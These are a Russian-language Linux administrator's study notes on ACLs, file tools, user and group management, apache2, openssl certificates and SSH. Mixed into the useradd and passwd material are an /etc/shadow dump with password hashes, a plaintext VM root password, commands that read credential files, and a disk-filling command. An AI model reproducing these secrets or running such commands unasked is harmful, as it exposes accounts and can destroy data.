Для каталогов: r (read) – чтение СПИСКА файлов. w (write) – Изменение и Создание ФАЙЛОВ в каталоге.
x (execute) – Открытие ФАЙЛОВ в каталоге.

                      - - -  ACL Списки доступа  - - - 
Утилита tar не поддерживает ACL. Чтобы сохранить настройки ACL, используйте star вместо tar
Cоздать резервную копию ACL с помощью " getfacl -R /directory > file.acls" , которую можно восстановить с помощью команды "setfacl --restore=file.acl"
// установить ACL на каталог diracl рекурсивно (с распространением правила ACL на вноьсоздаваемые файлы - право rwx для пол-ля mvn2, rx - для группы mint)
sudo setfacl -R -m d:u:mvn2:rwx ../diracl 
sudo setfacl -R -m d:g:mint:rx ../diracl
getfacl * // просмотр установленных прав на файлы в текущем каталоге20:52 11/7/2023
# file: F5.txt
# owner: root
# group: root
user::rw-
user:mvn2:rwx                   #effective:rw-
group::r-x                      #effective:r--
group:mint:r-x                  #effective:r--
mask::rw-
other::r--

# file: f6
# owner: mvn2
# group: mvn
user::rw-
user:mvn2:rwx                   #effective:rw-
group::r-x                      #effective:r--
group:mint:r-x                  #effective:r--
mask::rw-
other::r--

getfacl f1 // просмотр acl для f1

Файлы  с ACL в записях вывода "ls -l" содержат "+" как признак наличия ACL
  https://unix.stackexchange.com/questions/501108/what-does-a-plus-after-the-file-permission-bits-mean
$ ls -ld /var/log/journal
  drwxr-sr-x+ 3 root systemd-journal 4096 Oct  1 01:23 /var/log/journal


   ############### Информация о файлах и ПРОГРАММАХ #######################
file f.txt // инфа статистика о f.txt
file /usr/bin/cal // статистика о символ ссылке
     /usr/bin/cal: symbolic link to ncal
file -L /usr/bin/cal //  статистика о исполн файле, на который ссылается  символ ссылка
     /usr/bin/cal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
  
= = = СОЗДАТЬ ФАЙЛ = = = =
touch f1.txt f2.txt f3.txt // создать пустые  файлы file1-3.txt, изменить время создания файла
touch f{1..3}.txt // создать пустой file1-3.txt, изменить время сознания файла
touch -m f.txt  // изменить в inode i-node файла время "Модифицирован", "Изменён" на текщее
touch -a f.txt  // изменить в inode i-node файла время "Access/Доступ" на текщее
> file.txt  // создать пустой file.txt  !!!!!!!!!!!!!!!!!!!!
mkdir -p  /tmp/{2000..2010}/{01..12}/  // создать множество каталогов по годами и месяцам
touch  /tmp/{2000..2010}/{01..12}/day{0..23}.txt //создать в каталогх файлы
mktemp // создать  временный  файл d /tmp/ и вернуть его имя
  /tmp/tmp.crh4U2pzuu
truncate -s 15B  /tmp/123 // СОЗДАТЬ! файл размером -s / РАСШИРИТЬ/УМЕНЬШИТЬ РАЗМЕР ФАЙЛА ДО -s байт
cat /dev/zero > fzero // СОЗДАТЬ ФАЙЛ,путем чтения из /dev/zero и записи в файл (заполнить всеcь диск!)  /dev/zero - символьное устройство, генерирующее бесконечное число символов 
cat /dev/full > f123 // СОЗДАТЬ ФАЙЛ,путем чтения из /dev/full и записи в файл

less навигация : g10 на 10 строку, 50% на середину документа, G конец док
less поиск: /^\ + -l - найти строку, начин-ся с пробелов (любого кол-ва),а затем содер-ю -l


mv старое_имя новое_имя  //переименовать каталог/файл изменить название https://losst.pro/kak-pereimenovat-papku-linux#3_%D0%9A%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0_rename
rename - переименоваие с примен-ем регулярных выражений
who // показать пользователя, терминала
who -r // показать уровень выполнения systemd/init OC - runlevel 
whereis gcc  // поиск и отображает все найденные ею файлы bin man и исходн коды ()
which gcc // ЛУЧШИЙ ПОИСК ФАЙЛОВ !утилит!! согласно пути
whereis ls
    ls: /usr/bin/ls /usr/share/man/man1/ls.1.gz
which ls 
    /usr/bin/ls
which iperf3  lsscsi gcc // просмотр путей к !установленным программам!
    /usr/bin/iperf3  /usr/bin/lsscsi /usr/bin/gcc 

whatis // прогр-ма помощи, подсказки что есть команды  в одну строку 
makewhatis // программа индексатора базы whatis, хранимой в
          // var/cache/man/whatis (запускается раз в день ночью, но можно и 	  //принудительно). Некоторые пакеты программ содержат принудительное 	//регистрацию в базе whatis только что инсталл-ной программы, но не все
whatis locate //  find files by name ПОИСК ФАЙЛОВ ПО ИМЕНИ, quickly
whatis ls  // list directory contents
whatis which //  locate a command 
whatis whereis // locate the binary, source, and manual page files for a command
whatis find    // search for files in directory hierarchy  

type ll
   ll — это псевдонимом для «ls -alF»
type cmd // показать тип Команды/Программы/ССылки на прграмму и путь ней !!!!!
type less
    less является /usr/bin/less  !
type -a pwd
   pwd — это встроенная команда bash
   pwd является /usr/bin/pwd  
   pwd является /bin/pwd
type -a ls
   ls — это псевдонимом для «ls --color=auto»
   ls является /usr/bin/ls
   ls является /bin/ls

###### ПОЛЬЗОВАТЕЛИ Ч.1 Ketov Администрирование Linux, часть 2.1_ Пользовательские учетные записи и профили ######
 * Кратко создать пользователя profi c домашним каталогом /var/profi/, включить в группу oem 
   и подгруппу sudo*
1) Если пользовательская директорию будет в /home/ 
sudo useradd -g oem -s /bin/bash -m profi
sudo passwd profi
sudo usermod profi  -aG sudo # добавление в подгр sudo необязательно
2) Если пользовательская директорию НЕ будет в /home/
sudo useradd -g oem -s /bin/bash profi
sudo passwd profi
sudo mkdir /var/profi
sudo chown profi /var/profi 
sudo chgrp oem /var/profi
sudo usermod profi -d /var/profi -m -aG sudo # добавление в подгр sudo необязательно
sudo cp {.bash*,.profile} /var/profi/# этоне нужно,если dir в/home/(по-умолчанию) 
sudo chown profi /var/profi/{.bash*,.profile}
sudo chgrp oem /var/profi/{.bash*,.profile}   кратко, команды читай ниже *

ЛОКАЛЬНАЯ База данных (БД) Linux состоит из:
1)базы данных пользователей: два файла /etc/passwd и /etc/shadow, связанные по ключевым полям (первым) "username". 
Ранее базы passwd и shadow были в одном файле(!!см ниже подробнее "cat /etc/passwd cat /etc/shadow" )
2)базы данных групп пользователей: два файла /etc/group и /etc/gshadow
Также есть Сетевые БД = LDAP NIS NIS+
команды работы с лок БД


chfn - изменяет доп информацию о пользователе user fullname, office room number
chage -e 2023-12-31 mvn  изменяет информацию об устаревании пароля пользователя
chsh - изменяет регистрационную оболочку пользователя

БЕЗОПАСНОЕ ИЗМЕНЕНИЕ /etc/sudoers /etc/passwd /etc/shadow /etc/group
     /etc/group        содержит информацию о группах
     /etc/gshadow      содержит защищаемую информацию о группах
     /etc/passwd       содержит информацию о пользователях
     /etc/shadow       содержит защищаемую информацию о пользователях

       vipw, vigr - позволяют редактировать файлы паролей, групп, теневых паролей
       пользователей или групп.
visudo //  изменять безопасно /etc/sudoers
vipw // изменять безопасно файл /etc/passwd !!
vipw -s // изменять безопасно файл /etc/shadow !!
vigr   // изменять безопасно /etc/group 


chsh // изменяет оболочку пользователя
pwck // проверяет целостность файлов паролей
sudo pwck
  пользователь «lp: каталог «/var/spool/lpd» не существует
  пользователь «news: каталог «/var/spool/news» не существует
grpck // проверяет корректность файлов групп

КОманды ранее актуальные, когда (passwd и shadow ,были одним файлом) для обратной совместимости
  pwconv, pwunconv, grpconv, grpunconv - преобразует пароли пользователей и групп в/из защищённую форму

Создать пользователя mvn в группе stdnts и терминалом bash
sudo useradd -g stdnts  -s /bin/bash  -m -e 2023-12-31 mvn
sudo useradd -m mvn2 // добавить пользователя mvn2 и СОЗДАТЬ домашний каталог
sudo useradd -G sudo mvn2 // добавить пользователя mvn2 в группу sudo 
sudo passwd mvn //! задать пароль, корректно  толко через bash (на GUI Mint не рабоет?)! 
sudo userdel user_name // удалить
через GUI не работает как для   //  GUI так и через ssh !!!!??
sudo usermod -l новое_имя старое_имя // изменить имя пользователя
sudo usermod -L/-U mvn  // блокирова.разблокировать уч запись mvn
gpasswd -A mvn oem // НЕТ В MINT назначить mvn  администр-м в группе oem
gpasswd -a mvn sudo //НЕТ В MINT Добавление пользователя mvn в группу sudo !!!!!!!!
sudo cat /etc/gshadow | grep sudo
   sudo:*::oem,mvn
groupadd groupmod groupdel - аналогичны командам user*
grpck - проверяет корректность файлов групп he grpck command verifies the integrity 




  = Чтение Групп пользователей =
id // печать наcтоящих и эффективных пользователей и ID их групп   https://losst.pro/spisok-grupp-polzovatelya-linux
id -u // числовой идентиф текущего  пользователя  
id -Gn имя_пользователя //узнать список групп для определённого пользователя, просто передайте его имя в качестве параметра:
groups имя_пользователя // узнать группу пользователя Linux, передав его имя команде:
whoami // имя текущего  пользователя
who 
w
 
cat /etc/passwd //база хранения идентификаторов пользователей UID 
cat /etc/shadow // база хранения зашифрованных поролей пользователей. 
 //Если пользователь вместо пароля имеет "*" - ему вход в систему запрещен, паротль не задан/устрел
cat /etc/group //база хранения идентификаторов групп GID  
    root:$y$j9T$hjozaa4lXPKLFM0olA6Fk.$KKwRbLXSlP67OKL2GynXRGcx.5nsQw.YMGPFZuT61tB:19387:0:99999:7:::
    daemon:*:19343:0:99999:7:::
    bin:*:19343:0:99999:7:::
    sys:*:19343:0:99999:7:::
    mint:$y$j9T$/eJ3JKXl4mMTxaer49TpI.$qsNbjCP5AnGDVwYfXlztGO/YhLFHVkzoPPA5T0JyzVB:19387:0:99999:7:::
    sshd:*:19387:0:99999:7:::
    mvn:$y$j9T$EGH3S7OcGdtwGbduE8DEd.$bxkgspECc0dHkiP.hrTvlvGCsJy3pyYuBojXqb/6sk4:19387:0:99999:7:::
passwd -f // изменить реальное имя пол-ля
passwd -s // изменить оболочку пользователя
passwd -S, --status //  показать состояние пароля oem время создания и истечения действия
           Показать состояние учётной записи. Информация о состоянии содержит 7 полей.
           Первое поле содержит имя учётной записи. Второе поле указывает, заблокирован ли
           пароль учётной записи (L), она без пароля (NP) или у неё есть рабочий пароль
           (P). Третье поле хранит дату последнего изменения пароля. В следующих четырёх
           полях хранятся минимальный срок, максимальный срок, период выдачи
           предупреждения и период неактивности пароля. Эти сроки измеряются в днях.
          // (99999дней), количество дней предупреждения о смене (7)
  oem P 03/08/2023 0 99999 7 -1
ls -iahl /etc/skel // Профили по умолчанию (ШАБЛОНЫ ПРОФИЛЕЙ) для пользователей, копируются в папку                     //  /home/ххх пользователя. Шаблоны заполняются (ЭТАЛОННЫМИ) файлами общесистемынх 			// профилей из /etc/
787566 -rw-r--r--   1 root root  220 янв  6  2022 .bash_logout
787567 -rw-r--r--   1 root root 3,7K янв  6  2022 .bashrc
787568 -rw-r--r--   1 root root   22 сен  8  2011 .gtkrc-2.0
787569 -rw-r--r--   1 root root  516 дек 17  2013 .gtkrc-xfce
787570 -rw-r--r--   1 root root  807 янв  6  2022 .profile

ПОЛЬЗОВАТЕЛИ Ч.2
!СМ файл 19. Пользователи — Основы GNU_Linux
chage -l oem
  Последний раз пароль был изменён                                : мар 11, 2023
  Срок действия пароля истекает                                   : никогда
  Пароль будет деактивирован через                                : никогда
  Срок действия учётной записи истекает                           : никогда
  Минимальное количество дней между сменой пароля                 : 0
  Максимальное количество дней между сменой пароля                : 99999
  Количество дней с предупреждением перед деактивацией пароля     : 7

useradd -D // настройки по умолчанию для команды useradd 
   GROUP=100
   HOME=/home
   INACTIVE=-1
   EXPIRE=
   SHELL=/bin/sh
   SKEL=/etc/skel  // каталог, где хранятся шаблоны/скелентые файлы для bashrc и др
   CREATE_MAIL_SPOOL=no

Настройки по умолчанию распределены в двух файлах /etc/default/useradd и /etc/login.defs.
Первый файл – сугубо параметры утилиты useradd,  login.defs содержит параметры для многих утилит,
  работающих с пользователями и группами(в т.ч. MAIL_DIR, ENV_PATH, umaskб UID GID и др)
/etc/default/useradd: 
GROUP – если мы не захотим создавать личную группу пользователя, то группа по умолчанию будет группа с gid 100 – это группа users;
HOME – это внутри какой директории создастся домашняя директория пользователя. Т.е мы создаём пользователя user2 и для него создаётся директория user2 внутри директории /home.
INACTIVE –  через сколько дней после устаревания пароля заблокируется аккаунт: -1 – никогда, 0 – сразу же, как устареет пароль, ну или указываете количество дней.
EXPIRE – когда аккаунт заблокируется. Указывается как год, месяц, день (ГГГГ-ММ-ДД).
SHELL – какой интерпретатор будет по умолчанию, в данном случае /bin/bash;
   остальное, в тч о /etc/login.defs, читай -  файл 19. Пользователи — Основы GNU_Linux
sudo useradd и ключ -b – base dir – это собственно директория, внутри которой создастся домашняя
  директория пользователя, как параметр HOME в useradd. Допустим, если я укажу:

sudo useradd user4 -b /home/company/it
Ключ -G большое – для дополнительных групп. Допустим, если вы хотите, чтобы пользователь кроме основной группы был также в группах wheel и users2:
sudo useradd user4 -g users -G wheel,users2

Перенести домашнюю home директорию пользователя, добавить его в группу users:
sudo usermod user4 -d /var/user4 -m -aG users
Ключ -d указывает на новую домашнюю директорию, но без ключа -m текущая домашняя директория не
 перенесётся на новое место. Что касается -aG, то G указывает дополнительные группы, но без ключа
 -a все текущие группы пользователя сбросятся и останется одна группа user.

Назначить администратра (-A) и пользователей (-M)с помощью команды gpasswd:
sudo gpasswd group1 -A user -M user4,root
А администратор группы может добавлять и удалять пользователей из группы  без  прав root/sudo:
gpasswd -a user group1
gpasswd -d root group1

sudo lid user
sudo lid -g group1

sudo passwd mint // задать нов.пароль для mint  
sudo passwd root // задать нов.пароль для root
passwd root для VM qaz555 - 01/03/2023!!!!!!!!!!!

    * * * Users Пользователи Проверки входа пользователей в систему * * *
lastlog //Проверка Даты последнего входа для каждого пользователя и ВСЕХ пользователей!
$ lastlog 
Username         Port     From             Latest
root                                       **Never logged in**
hplip                                      **Never logged in**
mint             pts/3    10.250.15.3      Tue Feb 14 06:39:07 +0000 2023
sshd                                       **Never logged in**
usrssh           pts/4    10.250.15.3      Tue Feb 14 08:43:45 +0000 2023
mvn2             pts/5    10.250.15.3      Tue Feb 14 09:22:53 +0000 2023
last -a // список последних пользователей 
cat /etc/passwd  // вывод списка ВСЕХ пользователей в системе

users // скололько пользователей работает в системе
mint mint mvn2 // два mint mvn2- через  pts, один mint tty -  xfac4-session - GIU Linux

who //  show who is logged on
mint     tty7         2023-02-13 16:32 (:0) //  xfac4-session - GIU Linux
mint     pts/1        2023-02-14 04:11
mvn2     pts/5        2023-02-14 09:22 (10.250.15.3)
!Вызов tty терминалов ctrl+alt+f1-f5

w // какие пользователи сейчас активны в системе Show who is logged on and what they are doing.
09:26:01 up 17:52,  3 users,  load average: 0.01, 0.03, 0.00 // сколько система работает, сколько пользователей, закгрузка
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mint     tty7     :0               Mon16   17:52m  8:55   1.54s xfce4-session // x-session ! через GIU Linux
oem      pts/0    192.168.100.13   19:53    7.00s  0.25s  0.00s w // сессия через ssh
mvn      pts/2    192.168.100.13   20:10    4:12   0.02s  0.02s -bash // сессия через ssh
mvn      tty8     :1               20:13   22:29   3.70s  0.17s xfce4-session // x-session ! через GIU Linux 

finger mvn2 // подробная прогр данных о пользователе, включая его описание , терминал, директорию
 Login: oem                              Name: OEMadmin
 Directory: /home/oem                    Shell: /bin/bash
 On since Wed Mar  8 18:40 (+03) on tty7 from :0
    2 minutes 13 seconds idle
 On since Wed Mar  8 18:41 (+03) on pts/0 from 192.168.100.13
   1 second idle
 No mail.
 No Plan.

 = чтение Группы пользователя = 
cat /etc/group // список всех групп в ОС,нет отдельной команды как для 'id user' и 'groups user'

groups oem //  группы, куда входит пользователь
  oem : oem adm cdrom sudo dip plugdev lpadmin sambashare

id oem // перечисление uid в gid, групп куда входит пользователь
   uid=29999(oem) gid=29999(oem) группы=29999(oem),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115      (lpadmin),137(sambashare)



sudo useradd -g mint -p mvn -s /bin/bash -e 01:03:2023 //Создать пользователя mvn в группе mint и                       //терминалом bash. Чтобы интерфейс в bash был цветным, скопировать файлы .bashrc и                 //.profile в  /home/mvn/ из дир-рии /home/mint 
sudo passwd mvn // !!! пароль корректно задается толко через bash ! через GUI не работает как для                 //  GUI так и через ssh !!!!


		 = = = = = = = =  текстовые браузеры, apache2  = = = = = = = =
links
lynx 
GET -sS -Uu -e https://ya.ru  // запросить текст корневой страницы ya.ru

sudo service apache2 start  // запуск службы через systemV скрипт 
sudo service apache2 reload // перечитать  conf файлы без остановки службы
sudo systemctl start apache2.service // запуск службы через systemd утилиту
systemctl status apache2 // просмотр статуса apache2
journalctl -u apache2 // выборка из журналов об apache2

см конфигур разделов для apache2
конфигур-ние раздела для виртуальных хостов   /etc/apache2/sites-enabled/000-default.conf 
  SSL https://losst.pro/sozdanie-sertifikata-openssl?cmdurl=1#%D0%A1%D0%BE%D0%B7%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5_%D0%B7%D0%B0%D0%BA%D1%80%D1%8B%D1%82%D0%BE%D0%B3%D0%BE_%D0%BA%D0%BB%D1%8E%D1%87%D0%B0
СТОП! СТОП!

      = = =   web www http TLS SSL(заменен TLS)  = = =
Кетов WEB.4_ Аутентификация и авторизация.mp4
Алгоритмы шифрования используются как для Аутентификация и для защиты/шифрования передаваемого контента.
Общее: Аутентификация - проверка подлинности пользователя по его реквизитам: логина и пароля(контр суммам пороля), ключу шифр/сертификату, IP/MAC-адреса...  
Публичный ключ используется только для шифрования данных.
Ассиметричный алгоритмы шифрования (RSA,DSA,ECDSA, для шифрования и цифр подписи)-не имеют проблем с
  распространенем ключей удаленному ползователю, но более затратные,
  для шифрования и расшифрования применяется РАЗНЫЕ криптографические ключи.
  Криптографические системы с открытым ключом в настоящее время широко применяются 
  в различных сетевых протоколах, в частности, в протоколах TLS и его предшественнике SSL
  (лежащих в основе HTTPS), в SSH. wiki

Симетричный алгоритмы шифрования (AES DES 3DES) для шифрования и расшифрования применяется ОДИН и тот же криптографический ключ
  Ключ должен передваваться по отдельному защищеному каналу.
 Достоинства скорость простота реализации (за счёт более простых операций) меньшая требуемая длина ключа для сопоставимой стойкости
 изученность (за счёт большего возраста) wiki
 Недостатки сложность управления ключами в большой сети,сложность обмена ключами. Для применения необходимо решить проблему надёжной передачи ключей каждому абоненту, так как нужен секретный канал для передачи каждого ключа обеим сторонам

В web виды Аутентификация: 
1) базовая- передается на сервер непосредственно пароль, худший вариант, использовать только при шифровании  
2) digest - от сервера передается случайное число (nonce), удаленное PC шифрует его (nonce) функцией от пароля PC,
Fnonce(password), передает результат - "дайжест" - серверу, тот проделывает тоеже самое и сравнивает свой дайжест, 
 т.о.делает выводы о подлинности. (такой тип проверки подлинности использует windows для аутентификации пользователей)
3)с ипользованием сертифитката.  
 
  **Сертификат**- инф-я единица, содержащая в себе публичный ключ (не менее  512бит=64симв), ресурс(web) для
  которого он создан, названия страны,  компании его выдавшей, адрес удостоверящего центра 
 (для самоподписанного не указывается), цифровая подпись удостоверящего центра, 
 отпечаток публичного ключа (SHA/RSA fingerprint/thumbprint) и др данные.
  Сертификат(публичный ключ) генерируется на основе приватного ключа!!!!!
  PC/приложение пользователя направляет вместо пароля серверу его сертификат(публичный ключ).
  Сертификаты могут использоваться как для ssh доступа (см ниже), так и для web-доступа.
!!Сертификат- может заверятся (подписываться) удостоверящим центром (используется в публичных web серверах, 
  например www-ресурсы сервера yandex.ru т.о. идентифицируют себя), направляют сертфикат на PC,
  браузер PC обращатся в удостоверяющие центры , чьи адреса/сертификаты настроенные в нем, центры
  подтверждают по  КОНТРОЛЬНОЙ СУММЕ публичного ключа (fingerprint/thumbprint) браузеру, что сертификат действительно
  передан ресурсом с yandex.ru. //я: Проверка и потверждение КОНТРОЛЬНОЙ СУММЫ fingerprint/thumbprint - является 
  задачей удостоверяющих центров 
  Для корпоративных web-ресурсов можно применять самоподписанные сертификаты (без удостоверения 
  удостоверящего, сертификат подписывается секретным/private ключем , но тогда пользователи корп.web-ресурса должны сами будут проверить 
  контр сумму публичного ключа (fingerprint/thumbprint), которую им покажет браузер при первичном посещении ресурса.


Типы сертификатов и как их получить М.Асланов "GNU Linux Pro"
https://www.youtube.com/watch?v=rqTLP1vNa-U&t=180s&pp=ygVC0KLQuNC_0Ysg0YHQtdGA0YLQuNGE0LjQutCw0YLQvtCyINC4INC60LDQuiDQuNGFINC_0L7Qu9GD0YfQuNGC0Ywg
Цифровоай Сертификат содержит публичный ключ встречной стороны (сервера для www) + цифровую подпись удостоверяющего  центра 
 и др информацию (зайди в браузер\настройки\сертификаты ). 
 см также отдельный файл и уроки Созыкина https://www.youtube.com/watch?v=VIFJFHWlxzo
Если у браузера в настройках есть сертифакт этого удостоверяющего  центра, то браузер будет работать с сервером,
 предоставившим ему сертификат, т.е. будет "доверять" сертификату
Сертификат выдается на полное доменое имя (на ip адрес также, нО редко!).
 Платный сертфикат - включает стоимость страховки, платный необходим для шифрования трафика
  платежей и передачи важных данных.
Беспланый сертификат мождно получить в центре "Lets  Encrypt"
RSA - симметричное шифрование публичный ключ передается сервером, клиент/браузер шифрует 
 публичным ключем  preMasterkey/secret симметричного ключа и отправляет его 
DH алгоритм Диффи — Хеллмана, обе стороны отправлют др-др сатитич параметы или динамические (на эллиптических кривых),
 обмениваются ими и формирует т.о. ключ, используемый для симмтричн шифрования



Схема генерации сертификатов, проверки, Генерация CSR (Запрос подписи сертификата), использования (подписания) объектов с примененимем сертифатов !!!!!
https://upload.wikimedia.org/wikipedia/commons/8/8f/Usage-of-Digital-Certificate-ru.svg



https://losst.pro/sozdanie-sertifikata-openssl?cmdurl=1 (читать о запросах в центр сертификации удостоверяющий центр )     
 *Cертификат* - подписанный открытый ключ, плюс немного информации о вашей компании;
читать также   man openssl, man openssl-genpkeyl-genpkey
openssl genrsa >> prvrsa1.key // создать приватный ключ на основе RSA
openssl gendsa -out prvdsa2.key 2048 // создать приватный ключ на основе RSA
openssl genpkey -algorithm RSA -out prvrsa1key.pem // 
После сразу следует сделать "chmod g=,o= openssl-pkey" снять все права доступа для файла, кроме его пользователя-создателя

Сознание "самоподписанного" сертификата (т.е. сертификата, подписанного тем же ключем, на основе которого он был создан)
1) создать запрос на подпись (csr -Запрос подписи сертификата/Я:проект сертификата?) с помощью ключа prvrsa1.key
openssl req -key prvrsa1.key -new -out domain.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
-----
Country Name (2 letter code) [AU]:by
State or Province Name (full name) [Some-State]:Belarus
Locality Name (eg, city) []:Minsk
Organization Name (eg, company) [Internet Widgits Pty Ltd]:r&k
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:site.rk.btk.by
2) самоподписать сертификат (site-rk-btk-by.crt):
2.1)Первый вариант:
 openssl x509 -signkey  prvrsa1.key -in domain.csr -req -days 365 -out site-rk-btk-by.crt
Certificate request self-signature ok
subject=C = by, ST = Belarus, L = Minsk, O = r&k, CN = site.rk.btk.by
2.2)Второй вариант сразу создать и подписать (без создания csr файла)  сертификат:
 openssl req -new -x509 -days 300 -key prvrsa2.key -out site2-rk-btkby.crt

Просмотр файла-csr запроса на подпись сертфиката:
openssl req -text -noout -verify -in domain.csr
Просмотр сертификата:
openssl x509 -text -noout -in site2-rk-btkby.crt
или
openssl x509 -in site2-rk-btkby.crt -text

Кетов WEB.3_ HTTPS, SSL и самоподписанный сертификат.mp4
Для web www http (на apache) применяются Гибридное шифрование: ассиметричныое шифорование для 
 установления соединения ssl и далее симметричное сеансовыми ключами 
    (т.о. делается бесполезной атака "человек посередине/man in the midle"),
web-сервер направляет сертификат (открытый ключ, +ЭЦП), web-клиент/браузер его проверяет (в списке доверенных удостовер цетров для браузера) и если принимает сертификат, выбирает 
СимметричныЙ сеансовый ключ , шифрует его ОткрытыМ асимметр. ключем ИЗ сертификата и направляет web-сервереу.
Далее оба применяеют симм.ключ для отправки http (get, post, сообщений+ objects).
Т.о. web-сервер  web-клиент применяют http+ssl=https
если ссылка url начинается с https, то информация направляется на 443 порт сервера, а не 80 !!



https://ru.wikipedia.org/wiki/%D0%A6%D0%B8%D1%84%D1%80%D0%BE%D0%B2%D0%BE%D0%B9_%D1%81%D0%B5%D1%80%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%82
Цифровой сертификат — выпущенный удостоверяющим центром электронный или печатный документ, подтверждающий
принадлежность владельцу открытого ключа или каких-либо атрибутов.
Виды сертификатов X.509
1)"Сертификат открытого ключа(СОК)" удостоверяет принадлежность открытого ключа некоторому субъекту, пользователю/серверу. 
!!!!
"Сертификат открытого ключа" выдаётся центром сертификации и состоит из таких полей как:
сам "открытый ключ" владельца сертификата, срок действия, имя эмитента (центра сертификации), имя владельца сертификата и другие параметры, самой важной части, цифровой подписи удостоверяющего центра!!! Т.е. сертификат заверен подписью УЦ.
Цифровая подпись гарантирует невозможность подделки сертификата. Она является результатом криптографической хеш-функции от данных сертификата, зашифрованным закрытым ключом центра сертификации. Открытый ключ центра сертификации является общеизвестным, поэтому любой может расшифровать им цифровую подпись сертификата, затем вычислить хеш самостоятельно и сравнить, совпадают ли хеши. Если хеши совпадают — значит сертификат действительный и можно не сомневаться, что открытый ключ принадлежит именно тому, с кем мы собираемся устанавливать соединение.
Сертификат открытого ключа используется для идентификации субъекта и уточнения операций, которые субъекту разрешается совершать с использованием закрытого ключа, соответствующего открытому ключу, удостоверяемому данным сертификатом.
Формат СОК X.509 v3 описан в RFC 5280.

Открытый ключ может быть использован для организации защищённого канала связи с владельцем двумя способами:
-для проверки подписи владельца (аутентификация)
-для шифрования посылаемых ему данных (конфиденциальность)
Существует две модели организации инфраструктуры сертификатов: 
централизованная (PKI) и децентрализованная (реализуемая на основе т.н.сетей доверия), наибольшее распространение в сетях PGP.
2)Сертификат атрибутов - структура аналогична структуре СОК. 
Отличие же заключается в том, что сертификат атрибутов удостоверяет не открытый ключ субъекта, а какие-либо его атрибуты — принадлежность к какой-либо группе, роль, полномочия и т. п. Сертификат атрибутов применяется для авторизации субъекта. Описан в RFC 5755. Классификация сертификатов (VeriSign): — индивидуальные, для идентификации электронной почты; — для организаций;
— для серверов и программного обеспечения; — для онлайн-бизнеса и транзакций между компаниями; — для частных компаний или правительственной безопасности.

Типы SSL-сертификатов https://ru.wikipedia.org/wiki/SSL#%D0%A2%D0%B8%D0%BF%D1%8B_SSL-%D1%81%D0%B5%D1%80%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%82%D0%BE%D0%B2
Domain Validation (DV) Organization Validation (OV) Extended Validation (EV) 


 
		 = = = = = = = =   SSH, доступ через SSH = = = = = = = = 
apt instal ssh //  установить внешнюю службу ssh "apt instal ssh" для СЕРВЕРА/ДЭМОНА
service sshd restart // (пере)запустить службу   sshd 
C:ssh mint@10.250.15.152  // войти через win-клиента  по ssh
Кетов видео "SSH_ Протокол удаленного защищенного доступа.mp4"
1)Ключи публичные и приватные (ассиметричных алгоритмов) находятся на сервере в /etc/ssh/, публичные оканчиваются на pub
ls -ila /etc/ssh/
138701 -rw-------   1 root root    505 мар 11 16:08 ssh_host_ecdsa_key
138702 -rw-r--r--   1 root root    172 мар 11 16:08 ssh_host_ecdsa_key.pub
138703 -rw-------   1 root root    399 мар 11 16:08 ssh_host_ed25519_key
138704 -rw-r--r--   1 root root     92 мар 11 16:08 ssh_host_ed25519_key.pub
138699 -rw-------   1 root root   2590 мар 11 16:08 ssh_host_rsa_key
138700 -rw-r--r--   1 root root    564 мар 11 16:08 ssh_host_rsa_key.pub
138694 -rw-r--r--   1 root root    342 дек  7  2020 ssh_import_id
1.1) если удалить все файлы из этой папки и перезапустить службу service ssh restart
2) Публичные ключи передаются сервером sshd клиентской PС для ШИФРОВАНИЯ! данных
    (т.о. делается бесполезной атака "человек посередине/man in the midle" - !если только проверять fingerprint, см ниже),
приватные ключи (разных агоритов RSA DAS) используется только для РАСШИФРОВКИ. 
3) Публичные ключи хранятся в windows в файле  c:\Users\victo\.ssh\known_hosts 
4) Передаваевые заранее публичные ключи клиенту и приватные ключи на сервере служат для генерации/выбора
СЕАНСОВЫХ/одноразовых СИММЕТРИЧНЫХ ключей.
Криптостойкость Асим ключей - ниже чем Симметричных при одной и той же длине ключей, вычислительная подтребялемая мощность - выше
Сеансовый ключ может меняться как через 1 мин так и раз в сеанс (как настроить)! 
5) После первичной передачи публичн ключа от сервера ssh клиенту, выдается предложение проверить fingerprint ключа на сервере:
ssh oem@192.168.100.8
The authenticity of host '192.168.100.8 (192.168.100.8)' can't be established.
ECDSA key fingerprint is SHA256:sa9ieG0I7kTGa35ANZV5c3SiovV7aZi3b2sfDO/ED+0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.8' (ECDSA) to the list of known hosts.
5.1) посчитать контр сумму fingerprint ключа на сервере (и затем подтвердить пользователю по телефону,
чтобы тот убедился , что нет подмены "посередине")
ssh-keygen -lf /etc/ssh/ssh_host_ecdsa_key.pub #fingerprint ключа
256 SHA256:sa9ieG0I7kTGa35ANZV5c3SiovV7aZi3b2sfDO/ED+0 root@LnxPC (ECDSA)
5.2) после подтверждения на клинетской машине правильности fingerprint открытого  ключа, и в windows,
и в linux ключ добавляется в файл known_hosts (см c:\Users\victor\.ssh\)
6) ТАКЖЕ ДАЛEE в видео - аутентификация по ключам, а не паролям в ssh

программы, примеяющие ssh - scp и rsync для копирования 
Копирование файлов через сеть "по SSH" // https://losst.pro/kopirovanie-fajlov-scp
scp oem@192.168.100.9:/home/oem/f1.txt d: // записать НА PC HONOR
  f1.txt                                                                100%    4     3.8KB/s   00:00
scp oem@192.168.100.9:/home/oem/f* d:
  f1.txt    fn.txt
scp d:\f.txt oem@192.168.100.9:/home/oem/  // записать c  PC HONOR НА VM
  f.txt                                                      100%   61KB   5.1MB/s   00:00

rsync - fast, versatile, remote (and local) file-copying tool
https://losst.pro/rsync-primery-sinhronizatsii?cmdurl=1
 rsync -av ~/ /tmp/bacup // синхронизировать файлы в разных каталогоах на локальном PC
rsync -avz root@192.168.56.102:/home/ /home/sergiy/tmp/

apropos // search the manual page names and descriptions  ПОИСК ПОДХОДЯЩЕГО

